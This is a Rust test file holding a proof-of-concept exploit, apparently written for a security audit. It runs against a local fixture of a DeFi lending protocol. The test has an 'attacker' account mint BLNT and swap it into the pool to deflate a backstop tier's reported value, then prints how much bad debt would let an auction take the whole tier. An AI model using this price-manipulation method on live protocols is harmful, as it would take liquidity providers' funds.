#![cfg(test)]
#![allow(clippy::zero_prefixed_literal)]

use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};

/// The opposite skew: pushing BLNT into the anchor deflates every tier's
/// reported value. `allocate_bad_debt_tier` returns the *entire* tier once
/// `value <= 1.2 * debt_value`, so deflation directly balloons the bad-debt lot.
#[test]
fn poc_anchor_swap_deflates_every_tier_value() {
    for swaps in [1u32, 2, 3, 4, 6] {
        let fixture = create_fixture_with_data(false);
        let pool_address = fixture.pools[0].pool.address.clone();
        let blnt = &fixture.tokens[TokenIndex::BLNT];
        let usdc = &fixture.tokens[TokenIndex::USDC];
        let attacker = fixture.users[0].clone();

        let before = fixture.backstop.pool_data(&pool_address);
        let honest_value = before.tiers.get(1).unwrap().value;
        let tokens = before.tiers.get(1).unwrap().tokens;
        std::println!("BlntUsdc tier: tokens={} value={}", tokens, honest_value);

        blnt.mint(&attacker, &(2_000_000_000 * SCALAR_7));
        let blnt_before = blnt.balance(&attacker);
        let usdc_before = usdc.balance(&attacker);
        for _ in 0..swaps {
            let reserve = fixture.lp.get_balance(&blnt.address);
            fixture.lp.swap_exact_amount_in(
                &blnt.address,
                &(reserve / 4),
                &usdc.address,
                &0,
                &i128::MAX,
                &attacker,
            );
        }
        let after = fixture.backstop.pool_data(&pool_address);
        let skewed_value = after.tiers.get(1).unwrap().value;
        std::println!(
            "after BLNT-in skew: value={} ({}% of honest)",
            skewed_value,
            skewed_value * 100 / honest_value
        );

        // unwind
        let mut usdc_left = usdc.balance(&attacker) - usdc_before;
        while usdc_left > 0 {
            let reserve = fixture.lp.get_balance(&usdc.address);
            let amt = core::cmp::min(usdc_left, reserve / 4);
            if amt == 0 {
                break;
            }
            fixture.lp.swap_exact_amount_in(
                &usdc.address,
                &amt,
                &blnt.address,
                &0,
                &i128::MAX,
                &attacker,
            );
            usdc_left -= amt;
        }
        let blnt_cost = blnt_before - blnt.balance(&attacker);
        std::println!("round-trip BLNT cost = {} BLNT", blnt_cost / SCALAR_7);
        std::println!(
            "restored tier value = {}",
            fixture
                .backstop
                .pool_data(&pool_address)
                .tiers
                .get(1)
                .unwrap()
                .value
        );

        // A bad-debt auction quoted here takes the whole tier once the skewed
        // value falls to or below 1.2x the debt being covered.
        std::println!(
            "swaps={} -> value {}% of honest; BLNT round-trip cost ~ ${}; whole-tier \
         threshold: bad debt >= ${} sweeps all {} LP (~${})",
            swaps,
            skewed_value * 100 / honest_value,
            blnt_cost / 10 / SCALAR_7,
            skewed_value * 5 / 6 / SCALAR_7,
            tokens / SCALAR_7,
            honest_value / SCALAR_7,
        );
    }
}
